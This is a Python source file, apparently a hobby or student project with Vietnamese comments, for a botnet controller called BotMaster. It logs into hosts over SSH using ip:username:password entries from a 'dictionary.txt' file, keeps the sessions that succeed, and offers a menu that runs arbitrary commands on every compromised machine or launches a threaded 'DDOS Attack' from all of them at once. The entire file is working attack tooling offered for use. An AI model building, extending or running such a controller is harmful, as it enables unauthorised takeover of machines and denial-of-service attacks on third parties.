import threading
from botnet import SSHBotnet


class BotMaster: # class botMaster
    def __init__(self):
        self.__list_botnets = [] # danh sách bot khả dụng
        self.__scan_botnets() # quét bot

    def start(self):
        while True:
            try:
                option = int(input('''
                              +------------------------------------------------------+
                              |                  1) List bot alive                   |
                              |                                                      |
                              |                  2) Command Execution                |
                              |                                                      |
                              |                  3) DDOS Attack                      |
                              |                                                      |
                              |                  0) Exit                             |
                              +------------------------------------------------------+
                Select the option: '''))
                if option == 0:
                    break
                elif option == 1:
                    self.list_bot_alive()
                elif option == 2:
                    self.execute_command()
                elif option == 3:
                    self.ddos()
            except ValueError:
                print('Invalid input. Please enter a valid option.')

    def list_bot_alive(self): # hiển thị bot khả dụng
        if self.__list_botnets:
            print('\t\t=========> List Botnets <=========')
            for botnet in self.__list_botnets:
                botnet.show_infor()
        else:
            print('\t\t==> List botnet empty <===')

    def execute_command(self):
        if self.__list_botnets:
            cmd = input('\t\tEnter command >> ')
            while cmd != 'exit':
                for botnet in self.__list_botnets:
                    botnet.show_infor() # hiển thị
                    botnet.excute(cmd)  # Thực thi lệnh
                cmd = input('\t\tEnter command >> ')
        else:
            print('\t\t===> List botnets empty <===')

    @staticmethod
    def read_file(filename):
        with open(filename, 'r') as file:
            return [line.rstrip('\n').split(':') for line in file] # đọc từng dòng bỏ \n ở cuối

    def connect_botnet(self, ip, username, password):
        try:
            ssh = SSHBotnet(ip, username, password) # tạo 1 đối tượng SSH , không ngoại lệ thì add
            self.__list_botnets.append(ssh)
        except:
            pass

    def __scan_botnets(self):
        try:
            datas = self.read_file('dictionary.txt') # đọc file
            threads = []
            for data in datas:
                thread = threading.Thread(target=self.connect_botnet,
                                          args=(data[0], data[1], data[2])) # đa luồng
                thread.start() # bắt đầu
                threads.append(thread)
            for thread in threads:
                thread.join() # thực hiệ xong r kết thúc
        except:
            pass

    @staticmethod
    def attack_ddos(botnet, cmd): # tấn công ddos
        botnet.excute(cmd)

    def ddos(self):
        cmd = input('\t\tEnter command >> ')
        threads = []
        for botnet in self.__list_botnets:
            thread = threading.Thread(target=self.attack_ddos, args=(botnet, cmd))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()


if __name__ == '__main__':
    BotMaster().start()
